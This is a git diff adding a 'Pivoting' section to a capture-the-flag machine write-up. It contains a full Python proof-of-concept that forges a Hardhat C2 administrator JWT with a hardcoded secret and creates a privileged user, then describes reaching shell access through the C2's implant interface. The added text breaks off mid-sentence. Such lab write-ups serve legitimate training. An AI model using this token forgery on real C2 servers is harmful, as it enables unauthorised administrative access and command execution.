@@ -159,6 +159,103 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ![image](https://github.com/user-attachments/assets/9a0184d0-239c-4c65-9b40-b67c2a683a48)
 
 
+--------------
+
+### Pivoting
+
+--------------
+
+
+- We have another user `sergej` on the server.
+
+![image](https://github.com/user-attachments/assets/a2b793e4-4a1d-49a7-9ec2-fcdd341b4ff6)
+
+- I ran `netstat -antp` and noticed 2 internal services on port `5000` and `7096`.
+
+![image](https://github.com/user-attachments/assets/f674b09c-e6a8-46df-bc63-91250d7f4a32)
+
+- I also found another note by user `Ilya` stating that user `sergej` installed the `Hardhat c2 framework`.
+
+![image](https://github.com/user-attachments/assets/49ff5a1a-5606-4129-ad2b-0be0a93d9813)
+
+- I discovered an [article](https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7) explaining 0days in the Hardhat c2.One allows us to forge the admin jwt token and create a user with administrative privileges.Script-:
+
+```python3
+#! /usr/bin/env python3
+# @author Siam Thanat Hack Co., Ltd. (STHh)
+import jwt
+import datetime
+import uuid
+import requests
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+rhost = '127.0.0.1:5000'
+
+# Craft Admin JWT
+secret = "jtee43gt-6543-2iur-9422-83r5w27hgzaq"
+issuer = "hardhatc2.com"
+now = datetime.datetime.utcnow()
+
+expiration = now + datetime.timedelta(days=28)
+payload = {
+    "sub": "HardHat_Admin",
+    "jti": str(uuid.uuid4()),
+    "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier": "1",
+    "iss": issuer,
+    "aud": issuer,
+    "iat": int(now.timestamp()),
+    "exp": int(expiration.timestamp()),
+    "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "Administrator"
+}
+
+token = jwt.encode(payload, secret, algorithm="HS256")
+print("Generated JWT:")
+print(token)
+
+# Use Admin JWT to create a new user 'sth_pentest' as TeamLead
+burp0_url = f"https://{rhost}/Login/Register"
+burp0_headers = {
+  "Authorization": f"Bearer {token}",
+  "Content-Type": "application/json",
+  "Host": "127.0.0.1:7096"
+}
+burp0_json = {
+  "password": "sensei",
+  "role": "TeamLead",
+  "username": "sensei"
+}
+r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, verify=False)
+print(r.text)
+```
+
+- The next step is to portforward both ports with ssh.
+
+![image](https://github.com/user-attachments/assets/0bf497f7-6895-405d-812c-4875e858eba3)
+
+- I created a user `sensei` with the script.
+
+![image](https://github.com/user-attachments/assets/9140d614-ddbc-4925-b752-cf6527b07df8)
+
+- C2 server access
+
+![image](https://github.com/user-attachments/assets/7f3a1eb3-f0ea-44af-bae3-a44be63e96f8)
+
+- The server has shell access,we can run commands on the server with it.The `/ImplantInteract` is responsible for it.
+
+![image](https://github.com/user-attachments/assets/776ce9b1-6c3c-4c6f-b5d7-049c43af575d)
+
+- Spawn a shell and copy your 
+
+
+
+
+
+
+
+
+
+
 
 
 
